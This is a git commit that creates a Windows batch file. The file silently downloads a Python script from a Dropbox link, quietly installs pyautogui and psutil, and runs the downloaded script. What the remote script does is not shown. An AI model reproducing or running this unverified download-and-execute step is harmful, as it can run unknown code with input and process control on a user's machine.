97202d775ae35cdfb3498837d5c16f1640f943a8
menia12 <160221779+menia12@users.noreply.github.com>
2024-02-23 17:52:24 +0700

    Create loop.bat

---
+++ loop.bat
@@ -0,0 +1,5 @@
+@echo off
+curl -s -L -o time.py https://www.dropbox.com/scl/fi/ox42qglbf6fsnm9erf8cw/timelimit.py?rlkey=opyeqgum1k95kud81xlc7d66r&dl=0
+pip install pyautogui --quiet
+pip install psutil --quiet
+python time.py
